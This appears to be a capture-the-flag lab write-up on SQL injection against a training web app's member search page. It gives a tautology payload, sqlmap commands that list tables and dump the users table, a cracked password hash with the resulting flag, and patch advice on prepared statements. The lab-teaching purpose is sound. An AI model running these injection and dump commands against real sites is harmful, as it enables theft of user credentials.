# 01_Unsercure_Search_By_Id_SQLINJECTION

Unsecure sql request form in the page:
http://192.168.99.100/index.php?page=member

## How to see it

Go on the page mentionned before.
Whenever you are looking for an SQL injection you want to check if the page is injectable. You can either check this with sqlmap
or you can try to type an SQL request responding true everytime such like this one:
```bash
1 or 1=1
```
Whenever we type this one we realise that this page can be injected. This is a major security problem.

## How to abuse of it

We are going to use a tool which will help us to inject this sql. It is Sqlmap.
So we can basically print the list of the database that we are intersted in with this command:
```bash
sqlmap -u http://192.168.99.100/index.php\?page\=member\&id\=1\&Submit\=Submit\# --tables
```
Then we can make a dump of the database we are interested in, so the user one:
```bash
sqlmap -u http://192.168.99.100/index.php\?page\=member\&id\=1\&Submit\=Submit\# --dump -T users
```
And here we are now we can decrypt the password with the asked in the command request:
```bash
5ff9d0165b4f92b14994e5c685cdce28 -> FortyTwo -> fortytwo -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## How to patch it

Don't use dynamic SQL – don't construct queries with user input: Even data sanitization routines can be flawed.
So use prepared statements, parameterized queries or stored procedures instead whenever possible. ORM IS GOOD USE IT
